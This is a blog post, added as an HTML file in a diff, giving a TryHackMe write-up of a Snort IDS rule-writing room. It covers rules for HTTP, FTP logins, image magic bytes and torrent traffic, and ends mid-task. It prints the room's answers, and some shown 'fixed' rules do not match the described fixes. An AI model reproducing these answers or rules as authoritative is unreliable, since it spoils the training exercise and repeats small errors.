@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Mark Burton - Try Hack Me - Snort Challenges - The Basics</title>
+
+    <link rel="canonical" href="https://blog.mark-burton.com/posts/2023-06-02-tryhackme-snort-challenges-1">
+
+            <link type="application/rss+xml" rel="alternate" href="/feed.rss" />
+            <link type="application/atom+xml" rel="alternate" href="/feed.atom" />
+
+    <meta name="application-name" content="Mark Burton" />
+    <meta name="msapplication-tooltip" content="Mark Burton" />
+    <meta name="msapplication-starturl" content="/" />
+
+    <meta property="og:title" content="Mark Burton - Try Hack Me - Snort Challenges - The Basics" />
+        <meta property="og:image" content="/assets/Images/snort.png" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://blog.mark-burton.com/posts/2023-06-02-tryhackme-snort-challenges-1" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/vendor/bootstrap/scss/bootstrap.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href="/vendor/fontawesome-free/css/brands.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css' data-no-mirror>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css' data-no-mirror>
+
+    <!-- Custom styles for this template -->
+    <link href="/scss/clean-blog.css" rel="stylesheet">
+    
+    <!-- Bootstrap core JavaScript -->
+    <script src="/vendor/jquery/jquery.min.js"></script>
+    <script src="/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.19.0/components/prism-core.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.19.0/plugins/autoloader/prism-autoloader.min.js" data-no-mirror></script>
+    <script src="https://cdn.jsdelivr.net/npm/quicklink@2.0.0/dist/quicklink.umd.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.19.0/themes/prism.css">
+
+    <meta name="theme-color" content="#317EFB"/>
+<link rel="manifest" href="/manifest.json">
+
+<script>
+if ('serviceWorker' in navigator) {
+  if (navigator.serviceWorker.controller) {
+  console.log('[PWA Builder] active service worker found, no need to register')
+} else {
+  window.addEventListener('load', function() {
+    navigator.serviceWorker.register('/sw.js', {
+    scope: './'
+  }).then(function(registration) {
+      // Registration was successful
+      console.log('PAGE: ServiceWorker registration successful with scope: ', registration.scope);
+      //registration.update();
+    }, function(err) {
+      // registration failed :(
+      console.log('ServiceWorker registration failed: ', err);
+    });
+  });
+}
+}
+</script>
+
+    
+
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  <div class="container">
+    <a class="navbar-brand" href="/">Mark Burton</a>
+    <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+      Menu
+      <i class="fas fa-bars"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarResponsive">
+      <ul class="navbar-nav ml-auto">
+    <li class="dropdown nav-item"> 
+                                        <a href="/projects" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Projects<span class="caret"></span></a>
+                                        <ul class="dropdown-menu">
+                                            <li class="nav-item"><a href="https://noknok.pl" class="nav-link">LuxBus</a></li>
+                                            <li role="separator" class="divider"></li>
+                                            <li class="nav-item"><a href="https://noknok.pl" class="nav-link">NokNok</a></li>
+                                        </ul>
+    </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/posts">Posts</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/tags">Tags</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/search">Search</a>
+            </li>
+</ul>
+    </div>
+  </div>
+</nav>
+
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url(&quot;/assets/Images/snort.png&quot;)">
+  <div class="overlay"></div>
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="post-heading">
+          <h1>
+            Try Hack Me - Snort Challenges - The Basics
+          </h1>
+            <h2 class="subheading">This is my first Try Hack Me write up, the room is Snort Challenge - The Basics.</h2>
+              <div class="meta">Published on Friday, June 2, 2023</div>
+                <div class="mt-3">
+                      <a href="/tags/tryhackme" class="badge badge-light"> tryhackme</a>
+                      <a href="/tags/snort" class="badge badge-light"> snort</a>
+                </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+  <!-- Main Content -->
+  <div class="container"> 
+    <div class="row">
+      <div id="content" class="col-md-12">  
+        <h2 id="snort-challenge-the-basics">Snort Challenge - The Basics</h2>
+<p>This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.</p>
+<h3 id="task-1-introduction">Task 1 - Introduction</h3>
+<p>Start the machine, that's it.</p>
+<h3 id="task-2-writing-ids-rules-http">Task 2 - Writing IDS Rules (HTTP)</h3>
+<p>Let's create IDS Rules for HTTP traffic!
+Answer the questions below
+Navigate to the task folder.</p>
+<p>Use the given pcap file.</p>
+<p>Write rules to detect &quot;all TCP port 80 traffic&quot; packets in the given pcap file.</p>
+<h4 id="question-1">Question 1</h4>
+<p>What is the number of detected packets?</p>
+<p>Note: You must answer this question correctly before answering the rest of the questions in this task.</p>
+<p class="alert alert-info">Hint: You need to investigate inbound and outbound traffic on port 80. Writing two simple rules will help you. </p>
+<h4 id="notes">Notes</h4>
+<p>In the previous channel task 9 covers the structure of a snort rule which is summarized as</p>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Protocol</th>
+<th>Source IP</th>
+<th>Source Port</th>
+<th>Direction</th>
+<th>Dest IP</th>
+<th>Dest Port</th>
+<th>Options</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Alert</td>
+<td>TCP</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>Msg</td>
+</tr>
+<tr>
+<td>Drop</td>
+<td>UDP</td>
+<td>ANY</td>
+<td>ANY</td>
+<td>&lt;&gt;</td>
+<td>ANY</td>
+<td>ANY</td>
+<td>Reference</td>
+</tr>
+<tr>
+<td>Reject</td>
+<td>IMCP</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>SID</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>Rev</td>
+<td></td>
+</tr>
+<tr>
+<td>--------</td>
+<td>----------</td>
+<td>-----------</td>
+<td>-------------</td>
+<td>-----------</td>
+<td>---------</td>
+<td>-----------</td>
+<td>-----------</td>
+</tr>
+<tr>
+<td>Rule Header</td>
+<td>Rule Options</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>The hint says to make 2 rules, 1 rule for port 80 source and port 80 destination,</p>
+<pre><code class="language-bash">alert tcp any 80 &lt;&gt; any any (msg: &quot;port 80 origin&quot;; sid: 100001; rev: 1;)
+alert tcp any any &lt;&gt; any 80 (msg: &quot;port 80 destination&quot;; sid: 100002; rev:1;)
+</code></pre>
+<p>Then run snort with the local rules</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r mx-3.pcap
+</code></pre>
+<pre><code class="language-bash">Action Stats:
+     Alerts:          ??? ( 71.304%)
+     Logged:          ??? ( 71.304%)
+</code></pre>
+<h4 id="answer">Answer</h4>
+<blockquote>
+<p class="answer blur">328 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2">Question 2</h4>
+<p>Investigate the log file.</p>
+<p>What is the destination address of packet 63?</p>
+<p>I got to the answer using the following snort command.</p>
+<pre><code class="language-bash">snort -c local.rules -r mx-3.pcap -A console -n 63
+</code></pre>
+<p>But that isn't what the question asks, it specifically says <code>Investigate the log file.</code> so to read the log file instead use the command below.</p>
+<pre><code class="language-bash">sudo snort -r snort.log.1680776108 -n 64
+</code></pre>
+<pre><code class="language-bash">05/13-10:17:10.205385  [**] [1:100001:1] port 80 origin [**] [Priority: 0] {TCP} 65.208.228.223:80 -&gt; 145.254.160.237:3372
+</code></pre>
+<h4 id="answer-1">Answer</h4>
+<blockquote>
+<p class="answer blur">145.254.160.237 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-3">Question 3</h4>
+<p>Investigate the log file.</p>
+<p>What is the ACK number of packet 64?</p>
+<h5 id="notes-1">Notes</h5>
+<p>Similar to the previous question.</p>
+<pre><code class="language-bash">sudo snort -r snort.log.1686080304 -n 64
+</code></pre>
+<pre><code class="language-bash">WARNING: No preprocessors configured for policy 0.
+05/13-10:17:09.123830 65.208.228.223:80 -&gt; 145.254.160.237:3372
+TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF
+***A**** Seq: 0x114C66F0  Ack: 0x????????  Win: 0x1920  TcpLen: 20
+</code></pre>
+<h4 id="answer-2">Answer</h4>
+<blockquote>
+<p class="answer blur">0x38AFFFF3 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-4">Question 4</h4>
+<p>Investigate the log file.</p>
+<p>What is the SEQ number of packet 62?</p>
+<pre><code class="language-bash">sudo snort -r snort.log.1686080304 -n 62
+</code></pre>
+<pre><code class="language-bash">WARNING: No preprocessors configured for policy 0.
+05/13-10:17:09.123830 145.254.160.237:3372 -&gt; 65.208.228.223:80
+TCP TTL:128 TOS:0x0 ID:3910 IpLen:20 DgmLen:40 DF
+***A**** Seq: 0x????????  Ack: 0x114C66F0  Win: 0x25BC  TcpLen: 20
+</code></pre>
+<h4 id="answer-3">Answer</h4>
+<blockquote>
+<p class="answer blur">0x38AFFFF3 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-5">Question 5</h4>
+<p>Investigate the log file.</p>
+<p>What is the TTL number of packet 65?</p>
+<pre><code class="language-bash">sudo snort -r snort.log.1686080304 -n 65
+</code></pre>
+<pre><code class="language-bash">WARNING: No preprocessors configured for policy 0.
+05/13-10:17:09.324118 ???.???.???.???:???? -&gt; 65.208.228.223:80
+TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
+***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20
+
+</code></pre>
+<h4 id="answer-4">Answer</h4>
+<blockquote>
+<p class="answer blur">128 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-6">Question 6</h4>
+<p>Investigate the log file.</p>
+<p>What is the source IP number of packet 65?</p>
+<pre><code class="language-bash">sudo snort -r snort.log.1686080304 -n 65
+</code></pre>
+<pre><code class="language-bash">WARNING: No preprocessors configured for policy 0.
+05/13-10:17:09.324118 ???.???.???.???:???? -&gt; 65.208.228.223:80
+TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
+***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20
+</code></pre>
+<h4 id="answer-5">Answer</h4>
+<blockquote>
+<p class="answer blur">145.254.160.237 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-7">Question 7</h4>
+<p>Investigate the log file.</p>
+<p>What is the source port of packet 65?</p>
+<pre><code class="language-bash">sudo snort -r snort.log.1686080304 -n 65
+</code></pre>
+<pre><code class="language-bash">WARNING: No preprocessors configured for policy 0.
+05/13-10:17:09.324118 ???.???.???.???:???? -&gt; 65.208.228.223:80
+TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
+***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20
+</code></pre>
+<h4 id="answer-6">Answer</h4>
+<blockquote>
+<p class="answer blur">3372 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="task-3-writing-ids-rules-ftp">Task 3 - Writing IDS Rules (FTP)</h3>
+<p>Let's create IDS Rules for FTP traffic!
+Answer the questions below
+Navigate to the task folder.</p>
+<p>Use the given pcap file.</p>
+<p>Write rules to detect &quot;all TCP port 21&quot;  traffic in the given pcap.</p>
+<pre><code class="language-bash">alert tcp any 21 &lt;&gt; any any (msg: &quot;port 21 origin&quot;; sid: 100001; rev: 1;)
+alert tcp any any &lt;&gt; any 21 (msg: &quot;port 21 destination&quot;; sid: 100002; rev:1;)
+</code></pre>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="question-1-1">Question 1</h4>
+<p>What is the number of detected packets?</p>
+<h4 id="answer-7">Answer</h4>
+<blockquote>
+<p class="answer blur">614 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2-1">Question 2</h4>
+<p>Investigate the log file.</p>
+<p>What is the FTP service name?</p>
+<h4 id="answer-8">Answer</h4>
+<blockquote>
+<p class="answer blur">Microsoft FTP Service </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-3-1">Question 3</h4>
+<p><strong>Clear the previous log and alarm files.</strong></p>
+<p>Deactivate/comment on the old rules.</p>
+<p>Write a rule to detect failed FTP login attempts in the given pcap.</p>
+<p>What is the number of detected packets?</p>
+<h5 id="notes-2">notes</h5>
+<p>I know from mistyping a FTP login enough times that 530 is the code for a failed FTP login.</p>
+<p>Looking at the previous log I can see entries like <code>530 User admin cannot log in.</code></p>
+<p>So from the previous channel, <strong>Payload Detection Rule Options</strong>, it looks like I can use the <code>content:</code> to search for the 530.</p>
+<pre><code class="language-bash">alert tcp any 21 &lt;&gt; any any (msg: &quot;port 21 origin&quot;; content:&quot;530 &quot;; sid: 100001; rev: 1;)
+alert tcp any any &lt;&gt; any 21 (msg: &quot;port 21 destination&quot;; content:&quot;530 &quot;; sid: 100002; rev:1;)
+</code></pre>
+<p>This gives the answer 82 which is not correct.</p>
+<p class="alert alert-info">Hint: Each failed FTP login attempt prompts a default message with the pattern; &quot;530 User&quot;. Try to filter the given pattern in the inbound FTP traffic. </p>
+<p>So the hint helps, the rule should only be for inbound.</p>
+<pre><code class="language-bash">alert tcp any 21 &lt;&gt; any any (msg: &quot;port 21 origin&quot;; content:&quot;530 &quot;; sid: 100001; rev: 1;)
+</code></pre>
+<p>Run snort again to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="answer-9">Answer</h4>
+<blockquote>
+<p class="answer blur">41 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-4-1">Question 4</h4>
+<p><strong>Clear the previous log and alarm files.</strong></p>
+<p>Deactivate/comment on the old rule.</p>
+<p>Write a rule to detect successful FTP logins in the given pcap.</p>
+<p>What is the number of detected packets?</p>
+<h5 id="notes-3">Notes</h5>
+<p>Similar to the last quesiton but the code is 230</p>
+<pre><code class="language-bash">alert tcp any 21 &lt;&gt; any any (msg: &quot;port 21 origin&quot;; content:&quot;230 &quot;; sid: 100001; rev: 1;)
+</code></pre>
+<p>Run snort again to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="answer-10">Answer</h4>
+<blockquote>
+<p class="answer blur">1 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-5-1">Question 5</h4>
+<p><strong>Clear the previous log and alarm files.</strong></p>
+<p>Deactivate/comment on the old rule.</p>
+<p>Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.</p>
+<p>What is the number of detected packets?</p>
+<h5 id="notes-4">Notes</h5>
+<p>Looking at the output from the rule in question 1 there are several entries for <code>331 Password required for fred.</code> so I tried a rule for 331 in the body, same as the previous question it only makes sense to look for inbound traffic.</p>
+<pre><code class="language-bash">alert tcp any 21 &lt;&gt; any any (msg: &quot;port 21 origin&quot;; content:&quot;331 &quot;; sid: 100001; rev: 1;)
+</code></pre>
+<p>Run snort again to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="answer-11">Answer</h4>
+<blockquote>
+<p class="answer blur">42 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-6-1">Question 6</h4>
+<p><strong>Clear the previous log and alarm files.</strong></p>
+<p>Deactivate/comment on the old rule.</p>
+<p>Write a rule to detect failed FTP login attempts with &quot;Administrator&quot; username but a bad password or no password.</p>
+<p>What is the number of detected packets?</p>
+<h5 id="notes-5">Notes</h5>
+<p>This builds on the previous answers, so a rule like this could work</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 21 (msg: &quot;port 21 destination&quot;; content:&quot;331 Password required for Administrator&quot;; sid: 100001; rev: 1;)
+</code></pre>
+<p>But that is a kind of basic inflexible way to achieve it, lets make it more complex with the aid of a regex</p>
+<pre><code class="language-bash">alert tcp any any &lt;&gt; any 21 (msg: &quot;port 21 destination&quot;; pcre:&quot;/(331).*(administrator)/ix&quot;; sid: 100001; rev: 1;)
+</code></pre>
+<p>Run snort again to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="answer-12">Answer</h4>
+<blockquote>
+<p class="answer blur">7 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="task-3-writing-ids-rules-png">Task 3 - Writing IDS Rules (PNG)</h3>
+<p>Let's create IDS Rules for PNG files in the traffic!</p>
+<h4 id="question-1-2">Question 1</h4>
+<p>Use the given pcap file.</p>
+<p>Write a rule to detect the PNG file in the given pcap.</p>
+<p>Investigate the logs and identify the software name embedded in the packet.</p>
+<h5 id="notes-6">Notes</h5>
+<p>I could not figure this out from the channel, I tried a simple rule like</p>
+<pre><code class="language-bash">alert tcp any any -&gt; any any (content:&quot;png&quot;; msg:&quot;PNG&quot;;sid:10002; rev:1;)
+</code></pre>
+<p>It gave some results but nothing useful to answer the question.</p>
+<p>After some googling and trying to avoid other writeups I came across this article on <a href="https://asecuritysite.com/forensics/snort?fname=with_pdf.pcap&amp;rulesname=rulessig.rules">asecuritysite.com</a> which included the rule</p>
+<pre><code class="language-bash">alert tcp any any -&gt; any any (content:&quot;|89 50 4E 47|&quot;; msg:&quot;PNG&quot;;sid:10002)
+</code></pre>
+<p>I remember from a previous channel that the more certain way to identify a file rather then trusting the file extension is the files magic number or magic bytes, for png that is <code>89 50 4E 47</code>.</p>
+<p>With that rule in place run snort to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="answer-13">Answer</h4>
+<blockquote>
+<p class="answer blur">adobe imageready </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2-2">Question 2</h4>
+<p><strong>Clear the previous log and alarm files.</strong></p>
+<p>Deactivate/comment on the old rule.</p>
+<p>Write a rule to detect the GIF file in the given pcap.</p>
+<p>Investigate the logs and identify the image format embedded in the packet.</p>
+<h5 id="notes-7">Notes</h5>
+<p>Based on the previous question I assume we are looking for the magic bytes for gif, that can be <code>47 49 46 38 37 61</code> for GIF87a or <code>47 49 46 38 39 61</code> for GIF89a.</p>
+<p>Change the previous rule slightly and</p>
+<pre><code class="language-bash">alert tcp any any -&gt; any any (content:&quot;|47 49 46 38 39 61|&quot;; msg:&quot;PNG&quot;;sid:10002)
+</code></pre>
+<p>With that rule in place run snort to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r ftp-png-gif.pcap
+</code></pre>
+<h4 id="answer-14">Answer</h4>
+<blockquote>
+<p class="answer blur">GIF89a </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="task-5-writing-ids-rules-torrent-metafile">Task 5 - Writing IDS Rules (Torrent Metafile)</h3>
+<p>Let's create IDS Rules for torrent metafiles in the traffic!</p>
+<h4 id="question-1-3">Question 1</h4>
+<p>Use the given pcap file.</p>
+<p>Write a rule to detect the torrent metafile in the given pcap.</p>
+<h5 id="notes-8">Notes</h5>
+<p>A torrent meta file has an extension of <code>.torrent</code> lets see if that finds anything.</p>
+<pre><code class="language-bash">alert tcp any any -&gt; any any (content:&quot;.torrent&quot;; msg:&quot;PNG&quot;;sid:10002)
+</code></pre>
+<p>With that rule in place run snort to read the pcap with the new rule</p>
+<pre><code class="language-bash">snort -c local.rules -A full -l . -r torrent.pcap
+</code></pre>
+<p>Seems to work.</p>
+<h4 id="answer-15">Answer</h4>
+<blockquote>
+<p class="answer blur">2 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2-3">Question 2</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What is the name of the torrent application?</p>
+<h5 id="notes-9">Notes</h5>
+<p>This is just a <code>nano snort.log.1686496369</code> your log file name will be different.</p>
+<p>The output will be something like</p>
+<pre><code class="language-bash">�ò�^B^&#64;^D^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;�^E^&#64;^&#64;^A^&#64;^&#64;^&#64;���B�0^N^&#64;�^A^&#64;^&#64;�^A^&#64;^&#64;�� ^&#64;^&gt;
+�饐^V�^K�rP^X&quot;8�^&#64;^&#64;^&#64;GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED&gt;
+Accept: application/?-??????????
+Accept-Encoding: gzip
+User-Agent: RAZA 2.1.0.0
+Host: ????????.??????????.???:2710
+Connection: Keep-Alive
+</code></pre>
+<h4 id="answer-16">Answer</h4>
+<blockquote>
+<p class="answer blur">bittorrent </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-3-2">Question 3</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?</p>
+<h5 id="notes-10">Notes</h5>
+<p>Again this is just a <code>nano snort.log.1686496369</code> your log file name will be different.</p>
+<p>The output will be something like</p>
+<pre><code class="language-bash">�ò�^B^&#64;^D^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;�^E^&#64;^&#64;^A^&#64;^&#64;^&#64;���B�0^N^&#64;�^A^&#64;^&#64;�^A^&#64;^&#64;�� ^&#64;^&gt;
+�饐^V�^K�rP^X&quot;8�^&#64;^&#64;^&#64;GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED&gt;
+Accept: application/?-??????????
+Accept-Encoding: gzip
+User-Agent: RAZA 2.1.0.0
+Host: ????????.??????????.???:2710
+Connection: Keep-Alive
+</code></pre>
+<h4 id="answer-17">Answer</h4>
+<blockquote>
+<p class="answer blur">application/x-bittorrent </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-4-2">Question 4</h4>
+<p>Investigate the log/alarm files.</p>
+<p>What is the hostname of the torrent metafile?</p>
+<h5 id="notes-11">Notes</h5>
+<p>Again this is just a <code>nano snort.log.1686496369</code> your log file name will be different.</p>
+<p>The output will be something like</p>
+<pre><code class="language-bash">�ò�^B^&#64;^D^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;^&#64;�^E^&#64;^&#64;^A^&#64;^&#64;^&#64;���B�0^N^&#64;�^A^&#64;^&#64;�^A^&#64;^&#64;�� ^&#64;^&gt;
+�饐^V�^K�rP^X&quot;8�^&#64;^&#64;^&#64;GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED&gt;
+Accept: application/?-??????????
+Accept-Encoding: gzip
+User-Agent: RAZA 2.1.0.0
+Host: ????????.??????????.???:2710
+Connection: Keep-Alive
+</code></pre>
+<h4 id="answer-18">Answer</h4>
+<blockquote>
+<p class="answer blur">tracker2.torrentbox.com </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h3 id="task-6-troubleshooting-rule-syntax-errors">Task 6 - Troubleshooting Rule Syntax Errors</h3>
+<p>Let's troubleshoot rule syntax errors!</p>
+<p>In this section, you need to fix the syntax errors in the given rule files.</p>
+<p>You can test each ruleset with the following command structure;</p>
+<pre><code class="language-bash">sudo snort -c local-X.rules -r mx-1.pcap -A console
+</code></pre>
+<h4 id="question-1-4">Question 1</h4>
+<p>Fix the syntax error in local-1.rules file and make it work smoothly.</p>
+<p>What is the number of the detected packets?</p>
+<h5 id="notes-12">Notes</h5>
+<p>The rule defined in <code>local-1.rules</code> is;</p>
+<pre><code class="language-bash">alert tcp any 3372 -&gt; any any(msg: &quot;Troubleshooting 1&quot;; sid:1000001; rev:1;)
+</code></pre>
+<p>Running snort with the provided command gives the following error;</p>
+<pre><code class="language-bash">Initializing rule chains...
+ERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)
+&gt;&gt;any(msg:
+&gt;&gt;^
+</code></pre>
+<p>This is a missing space between any and the opening bracket, the fixed rule is;</p>
+<pre><code class="language-bash">alert tcp any 3372 -&gt; any any(msg: &quot;Troubleshooting 1&quot;; sid:1000001; rev:1;)
+</code></pre>
+<h4 id="answer-19">Answer</h4>
+<blockquote>
+<p class="answer blur">16 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-2-4">Question 2</h4>
+<p>Fix the syntax error in local-2.rules file and make it work smoothly.</p>
+<p>What is the number of the detected packets?</p>
+<h5 id="notes-13">Notes</h5>
+<p>The rule defined in <code>local-2.rules</code> is;</p>
+<pre><code class="language-bash">alert icmp any -&gt; any any (msg: &quot;Troubleshooting 2&quot;; sid:1000001; rev:1;)
+</code></pre>
+<p>Running snort with the provided command gives the following error;</p>
+<pre><code class="language-bash">Initializing rule chains...
+ERROR: local-2.rules(8) Port value missing in rule!
+Fatal Error, Quitting..
+</code></pre>
+<p>This time the port number is missing from the origin part of the rule, the fixed rule is;</p>
+<pre><code class="language-bash">alert tcp any any -&gt; any any(msg: &quot;Troubleshooting 2&quot;; sid:1000001; rev:1;)
+</code></pre>
+<h4 id="answer-20">Answer</h4>
+<blockquote>
+<p class="answer blur">68 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-3-3">Question 3</h4>
+<p>Fix the syntax error in local-3.rules file and make it work smoothly.</p>
+<p>What is the number of the detected packets?</p>
+<h5 id="notes-14">Notes</h5>
+<p>The rule defined in <code>local-3.rules</code> is;</p>
+<pre><code class="language-bash">alert icmp any any -&gt; any any (msg: &quot;ICMP Packet Found&quot;; sid:1000001; rev:1;)
+alert tcp any any -&gt; any 80,443 (msg: &quot;HTTPX Packet Found&quot;; sid:1000001; rev:1;)
+</code></pre>
+<p>Running snort with the provided command gives the following error;</p>
+<pre><code class="language-bash">Initializing rule chains...
+ERROR: local-3.rules(9) GID 1 SID 1000001 in rule duplicates previous rule, with different protocol.
+Fatal Error, Quitting..
+</code></pre>
+<p>This time the tells us the same SID is used in 2 different rules, the fixed rule is;</p>
+<pre><code class="language-bash">alert icmp any any -&gt; any any (msg: &quot;ICMP Packet Found&quot;; sid:1000001; rev:1;)
+alert tcp any any -&gt; any 80,443 (msg: &quot;HTTPX Packet Found&quot;; sid:1000002; rev:1;)
+</code></pre>
+<h4 id="answer-21">Answer</h4>
+<blockquote>
+<p class="answer blur">87 </p>
+</blockquote>
+<p class="reveal-answer btn btn-primary"><a href="#">Reveal Answer</a> </p>
+<h4 id="question-4-3">Question 4</h4>
+<p>Fix the syntax error in local-4.rules file and make it work smoothly.</p>
+<p>What is the number of the detected packets?</p>
+<h5 id="notes-15">Notes</h5>
+<p>The rule defined in <code>local-4.rules</code> is;</p>
+<pre><code class="language-bash">alert icmp any any -&gt; any any (msg: &quot;ICMP Packet Found&quot;; sid:1000001; rev:1;)
+alert tcp any 80,443 -&gt; any any (msg: &quot;HTTPX Packet Found&quot;: sid:1000001; rev:1;)
+</code></pre>
+<p>Running snort with the provided command gives the following error;</p>
+<pre><code class="language-bash">Initializing rule chains...
+ERROR: local-4.rules(9) Unmatch quote in rule option 'msg'.
+Fatal Error, Quitting..
+</code></pre>
+<p>The error is a little misleading and it is easier to see the problem with the syntax highlighting, rather than it being an unmatched quote it is a colon instead of a semi-colon after msg in the second rule. There is a second issue which is the same as the previous question, the SID is the same in both rules, the fixed rule is;</p>
+<pre><code class="language-bash">alert icmp any any -&gt; any any (msg: &quot;ICMP Packet Found&quot;; sid:1000001; rev:1;)
